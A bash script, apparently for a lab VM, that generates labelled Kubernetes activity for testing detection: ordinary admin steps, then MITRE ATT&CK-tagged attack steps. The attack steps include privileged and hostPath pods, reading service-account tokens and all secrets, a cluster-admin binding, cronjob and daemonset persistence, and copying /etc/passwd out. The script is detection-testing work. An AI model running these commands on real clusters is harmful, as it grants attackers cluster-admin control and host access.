#!/usr/bin/env bash
# Inside the lab VM, network Host Only. Every step is labelled BEFORE it runs: attack or ordinary, and the technique.
set -uo pipefail
L=/opt/lab/labels.jsonl; : > "$L"
step() { printf '{"t":"%s","label":"%s","technique":"%s","what":"%s"}\n' "$(date -u +%FT%T.%3NZ)" "$1" "$2" "$3" >> "$L"; sleep 2; }
k() { kubectl "$@" >/dev/null 2>&1 || true; }
# --- ordinary administration (false-alarm measurement)
step ordinary deploy "deployment with 2 replicas";      k create deployment web --image=nginx:1.27 --replicas=2
step ordinary service "ClusterIP service";              k expose deployment web --port 80
step ordinary scale "scale to 3";                       k scale deployment web --replicas=3
step ordinary configmap "config map";                   k create configmap app-config --from-literal=mode=prod
step ordinary secret "application secret created";      k create secret generic app-db --from-literal=password=lab-only
step ordinary read "list pods and services";            k get pods,svc -A
step ordinary role "namespaced read-only role";         k create role viewer --verb=get,list --resource=pods
# --- attacks (MITRE ATT&CK for containers)
step attack T1610 "privileged pod";                     k run priv --image=busybox:1.36 --overrides='{"spec":{"containers":[{"name":"priv","image":"busybox:1.36","command":["sleep","3600"],"securityContext":{"privileged":true}}]}}'
step attack T1611 "hostPath / mount and host PID";       k run hostp --image=busybox:1.36 --overrides='{"spec":{"hostPID":true,"containers":[{"name":"h","image":"busybox:1.36","command":["sleep","3600"],"volumeMounts":[{"name":"r","mountPath":"/host"}]}],"volumes":[{"name":"r","hostPath":{"path":"/"}}]}}'
sleep 15
step attack T1609 "exec into pod";                       k exec deploy/web -- id
step attack T1528 "read service-account token via exec"; k exec deploy/web -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
step attack T1552.007 "list secrets in all namespaces";  k get secrets -A
step attack T1098 "bind default SA to cluster-admin";    k create clusterrolebinding pwn --clusterrole=cluster-admin --serviceaccount=default:default
step attack T1053.007 "cronjob persistence";             k create cronjob beacon --image=busybox:1.36 --schedule="*/5 * * * *" -- sh -c "echo beacon"
step attack T1543 "daemonset on every node";             k create -f - <<'DS'
apiVersion: apps/v1
kind: DaemonSet
metadata: {name: node-agent, namespace: kube-system}
spec:
  selector: {matchLabels: {app: node-agent}}
  template:
    metadata: {labels: {app: node-agent}}
    spec: {containers: [{name: a, image: busybox:1.36, command: ["sleep", "3600"]}]}
DS
step attack T1133 "NodePort exposure";                   k expose deployment web --name web-np --type NodePort --port 80
step attack T1528 "service-account token requested";     k create token default --duration=24h
step attack T1048 "copy files out (kubectl cp)";         kubectl cp default/$(kubectl get pod -l app=web -o name | head -1 | cut -d/ -f2):/etc/passwd /tmp/x >/dev/null 2>&1 || true
step ordinary cleanup "delete test deployment";          k delete deployment web
echo "done: $(wc -l < "$L") labelled steps"
